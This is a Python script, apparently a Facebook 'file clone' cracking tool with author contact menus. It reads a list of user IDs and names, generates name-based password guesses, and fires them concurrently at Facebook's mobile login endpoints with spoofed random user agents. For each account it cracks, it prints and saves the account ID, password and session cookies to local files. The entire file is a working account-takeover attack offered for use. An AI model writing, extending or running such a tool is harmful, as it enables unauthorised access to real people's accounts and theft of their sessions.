import requests,re,os,string,json,time,sys,random
from concurrent.futures import ThreadPoolExecutor as tred
#==============[Data type]=======#
ugen,id,id2,cp,loop,ok=[],[],[],[],0,0,
#==============[colours]=================#
BL="\033[1;30m" # Black
RR="\033[1;31m" # Red
GR="\033[1;32m" # Green
YY="\033[1;33m" # Yellow
BB="\033[1;34m" # Blue
PP="\033[1;35m" # Purple
CC="\033[1;36m" # Cyan
W="\033[1;37m"# White
#==============[info]=================#
credit ="ZUYAN_^_^"
#=========[animation]======#
def zu(t):
    for e in t + '\n':
    	sys.stdout.write(e),sys.stdout.flush(),time.sleep(0.06)
#=============[Chat admin]=====≠=========#
def chat():
	zu(40*f'=')
	print(f'{W}[{GR}1{W}] CONTACT ADMIN')
	print(f'{W}[{GR}2{W}] CONTACT WHATSAPP')
	cht = input(f'{W}[{GR}+{W}] Choice :{GR} ')
	if cht =='1':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100092573564557')
		Main()
	elif cht =='2':
		os.system('xdg-open https://wa.me/+01837478901')
		Main()
		
#============[Ugen]===================#
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen.append(uaku)
    aa = 'Mozilla/5.0 (Linux; Android 5.1.1; SM-N920X)'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12',
        '13'])
    c = ' en-us; GT-'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    for x in range(100):
        a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
        b = random.randrange(100, 9999)
        c = random.randrange(100, 9999)
        d = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        e = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        f = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        g = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        h = random.randrange(1, 9)
        i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
        j = random.randrange(1, 9)
        k = random.randrange(1, 9)
        l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
        uak = f'''{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'''
#==============[Main]=================#
def Main():
	os.system('clear')
	zu(40*f'{W}=')
	print(f'{W}[{GR}+{W}] OPEN SOURCE BY : LMNX9 | Mr.Zuyan')
	print(40*'-')
	zu(f'{W}[{GR}1{W}] File Clone |{W}[{GR}2{W}] EDITOR : MR.ZUYAN')
	zu(f'{W}[{GR}0{W}] 3xit Tools |{W}[{GR}3{W}] Contact : MR.ZUYAN')
	print(40*f'{W}=')
	option=input(f'{W}[{GR}+{W}] Choice :{GR} ')
	if option =='1':
		file()
	elif option =='0':
		print(f'{W}[{GR}+{W}] 3xit Success')
	elif option =='3':
		chat()
	else:
		print(f'{W}[{GR}+{W}] Please Select Correctly')
		time.sleep(2)
		Main()
#==============[file picker]=================#
def file():
	os.system('clear')
	print(40*f'{W}=')
	print(f'{W}[{GR}+{W}] FACEBOOK : Legends Aery Ace |Mr.Zuyan')
	print(f'{W}[{GR}+{W}] WHATSAPP : +8801837478901')
	print(f'{W}[{GR}+{W}] GitHub : Legendhj')
	print(40*f'{W}=')
	zu(f'{W}[{GR}+{W}] Example : /sdcard/zuyan.txt')
	print(40*'-')
	file=input(f'{W}[{GR}+{W}] Enter File Path :{GR}  ')
	try:crazy=open(file).read().splitlines()
	except:
		print(f'{W}[{GR}+{W}] Please Enter Correct Path'),time.sleep(2)
		file()
	for xid in crazy:
		id.append(xid)
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	passwrd()
#=============[Auto password]==================#
def passwrd():
    os.system('clear')
    print(40*f'{W}=')
    print(f'{W}[{GR}+{W}] Total Ids : {str(len(id))} |Your crack limit')
    print(f"{W}[{GR}+{W}] WRITE AND EDITOR MR.ZUYAN |source : lmnx9")
    print(f'{W}[{GR}+{W}] Use Airplane M0de for speed up{W} |Only use.1 minutes')
    print(40*'=')
    with tred(max_workers=30) as Zuyan8:
        for yuzong in id2:
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
            nmg = yuzong.split('|')[1]
            frs = nmf.split(' ')[0]
            frst = nmg.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'112')
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append(nmg)
                    pwv.append('i love you')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'@1')
                    pwv.append(frs+'@12')
                    pwv.append(frs+'@#123')
                    pwv.append(frs+'143')
                    pwv.append(frs+'1111')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                    pwv.append(nmg)
                else:
                    pwv.append(frs+'112')
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append(nmg)
                    pwv.append('i love you')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'@1')
                    pwv.append(frs+'@12')
                    pwv.append(frs+'@#123')
                    pwv.append(frs+'143')
                    pwv.append(frs+'1111')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
                if len(frst)<3:
                	pass
                else:
                	pwv.append(frst+'@123')
                	pwv.append(frst+'@123')
                	pwv.append(frst+'@1')
                	pwv.append(frst+'@#123')
                	pwv.append(nmf)
                	pwv.append(nmg)
                	pwv.append(frst+'12')
                	pwv.append(frst+'123')
                	pwv.append(frst+'1122')
                	pwv.append(frst+'@#@#@#')
                	pwv.append(frst+'11')
                	pwv.append(frst+'112233')
                	pwv.append(frst+'143')
                	pwv.append(frst+'404')
                	pwv.append(frst+'10')
                	pwv.append(frst+'00')
                	pwv.append(frst+'111')
                	Zuyan8.submit(cracks,idf,pwv)
#=============[login Method M-facebook]==================#
def cracks(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{W}[{GR}M16{W}] ~ [{GR}{loop}{W}] ~ [{GR}{len(id)}{W}] ~ [{W}Success:{GR}{ok}{W}] "),sys.stdout.flush()
    ua = random.choice(ugen)
    mt = ['m','free','p','x']
    xs=random.choice(mt)
    ses = requests.Session()
    for pw in pwv:
        try:
            #ZUYAN_BOSS
            p = ses.get(f'https://p.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post(f'https://{xs}.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False,headers=heade)
            ZuyanM=ses.cookies.get_dict().keys()
            if "c_user" in ZuyanM:
            	coki=ses.cookies.get_dict()
            	kuki = (f";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
            	print(f'\r{GR}[Cracked🌺] {idf} | {pw}\n\033[0;92mCookie : \033[0;92m{kuki} ')
            	open('/sdcard/M1-0ks.txt','a').write(idf+' | '+pw+'\n')
            	ok+=1
            	break  
            elif 'checkpoint' in ZuyanM:
                print(f'\r\033[1;30m[Cp] {idf} | {pw}')
                open('/sdcard/M1-Cps.txt','a').write(idf+' • '+pw+'\n')
                cp.append(idf)
                break   
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#================[End]===============#
Main()